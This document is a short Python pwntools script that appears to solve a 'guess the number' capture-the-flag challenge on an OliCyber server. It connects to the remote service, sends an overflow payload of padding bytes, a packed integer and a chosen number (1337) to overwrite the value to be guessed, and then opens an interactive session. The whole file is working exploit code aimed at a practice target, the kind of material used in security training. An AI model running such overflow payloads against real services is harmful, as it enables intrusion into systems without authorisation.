from pwn import *

p = remote("gtn.challs.olicyber.it", 10022)

p.recvuntil(b'scores:')
number = 1337
p.sendline(b'a'*20 + p32(5) +(number).to_bytes(8))
p.recvuntil(b"bout? Try to guess it!\n")
# p.sendline((number).to_bytes(8))
p.interactive()